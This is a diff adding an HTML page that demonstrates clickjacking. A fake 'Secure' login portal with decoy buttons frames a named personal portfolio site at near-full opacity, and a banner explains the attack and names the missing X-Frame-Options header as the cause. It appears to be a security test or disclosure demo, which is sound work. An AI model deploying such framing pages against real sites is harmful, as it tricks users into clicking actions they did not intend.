@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🔥 Clickjacking Exploit Demo - Portfolio Security Test</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            padding: 30px; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            min-height: 100vh;
+        }
+        .exploit-ui { 
+            background: rgba(255,255,255,0.1); 
+            padding: 25px; 
+            border-radius: 15px;
+            margin-bottom: 25px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        iframe {
+            border: 4px solid #ff4444;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(255,0,0,0.5);
+            background: white;
+        }
+        .warning {
+            background: #ff4444;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        button {
+            background: #28a745;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="exploit-ui">
+        <h1>🔐 "Secure" Login Portal</h1>
+        <p><strong>Welcome to your dashboard! Please interact with the application below:</strong></p>
+        
+        <div style="text-align: center; margin: 20px 0;">
+            <button onclick="alert('Fake button clicked!')">📊 View Analytics</button>
+            <button onclick="alert('Fake button clicked!')">⚙️ Settings</button>
+            <button onclick="alert('Fake button clicked!')">📧 Messages</button>
+        </div>
+        
+        <p><em>Notice: The application panel below is part of our secure interface...</em></p>
+    </div>
+
+    <!-- EXPLOIT: Your portfolio loads here -->
+    <iframe src="https://dhamnekarpravin.github.io/devfolio/" 
+            width="100%" 
+            height="700px"
+            style="opacity: 0.9;">
+    </iframe>
+    
+    <div class="warning">
+        🔴 <strong>VULNERABILITY EXPLOITED:</strong> 
+        This demonstrates a real clickjacking attack. Your portfolio is loaded transparently. 
+        Users might click buttons thinking they're part of this fake portal.
+    </div>
+
+    <div style="margin-top: 20px;">
+        <p><strong>🎯 Attack Impact:</strong> Attackers can overlay fake UI elements, trick users into clicking your actual site's buttons.</p>
+        <p><strong>🛡️ Missing Protection:</strong> X-Frame-Options header</p>
+    </div>
+</body>
+</html>
